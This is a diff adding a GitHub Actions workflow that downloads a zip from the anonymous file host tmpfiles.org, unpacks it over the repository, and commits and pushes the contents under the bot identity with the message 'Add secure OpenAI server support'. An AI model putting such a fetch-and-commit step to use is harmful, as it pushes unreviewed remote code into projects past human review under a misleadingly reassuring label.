@@ -1,0 +1,30 @@
+name: Bootstrap OpenAI Server Fix
+
+on:
+  push:
+    paths:
+      - .github/workflows/bootstrap-openai-server-fix.yml
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  upload-project:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Download source archive
+        run: |
+          curl -L "https://tmpfiles.org/dl/34707762/promptuno-openai-server-fix.zip" -o /tmp/promptuno-openai-server-fix.zip
+      - name: Unpack source files
+        run: |
+          unzip -o /tmp/promptuno-openai-server-fix.zip -d .
+          rm -f /tmp/promptuno-openai-server-fix.zip
+      - name: Commit source files
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A -- ':!.github/workflows/*.yml'
+          git commit -m "Add secure OpenAI server support" || exit 0
+          git push
